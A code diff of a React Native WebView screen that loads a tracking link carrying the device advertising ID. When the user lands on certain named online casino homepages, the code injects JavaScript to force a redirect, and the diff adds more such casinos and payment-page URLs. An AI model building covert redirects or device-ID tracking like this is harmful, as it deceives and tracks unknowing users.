@@ -64,7 +64,9 @@ const Prod = ({navigation, route}) => {
   useEffect(() => {
     WebView.userAgent = customUserAgent;
   }, []);
-
+  // https://invoices.cryptoprocessing.com/invoice
+  // https://rizzcasino.com/en/cashier/deposit
+  //
   const urlProd = `https://excellent-regal-joy.space/rKtP8fwP?advertising_id=${idfa}`;
   const refWebview = useRef(null);
 
@@ -93,7 +95,7 @@ const Prod = ({navigation, route}) => {
       )
     ) {
       setRedirectUrl(
-        `https://marvelous-cool-win.space/C2WY8x5g?advertising_id=${idfa}`,
+        `https://excellent-regal-joy.space/rKtP8fwP?advertising_id=${idfa}`,
       );
     } else if (
       url.includes('https://interac.express-connect.com/cpi?transaction=')
@@ -141,7 +143,7 @@ const Prod = ({navigation, route}) => {
             url.includes('bitcoincash')
           ) {
             return false;
-          } else if (url === 'https://jokabet.com/') {
+          } else if (url === 'https://zumospin.com/') {
             refWebview.current.injectJavaScript(
               `window.location.href = '${redirectUrl}'`,
             );
@@ -153,11 +155,21 @@ const Prod = ({navigation, route}) => {
               `window.location.href = '${redirectUrl}'`,
             );
             return false;
+          } else if (url === 'https://b7casino.com/') {
+            refWebview.current.injectJavaScript(
+              `window.location.href = '${redirectUrl}'`,
+            );
+            return false;
+          } else if (url === 'https://brunocasino.com/') {
+            refWebview.current.injectJavaScript(
+              `window.location.href = '${redirectUrl}'`,
+            );
+            return false;
           } else {
             return true;
           }
         }}
-        //onNavigationStateChange={handleNavigationStateChange}
+        onNavigationStateChange={handleNavigationStateChange}
         textZoom={100}
         allowsBackForwardNavigationGestures={true}
         domStorageEnabled={true}
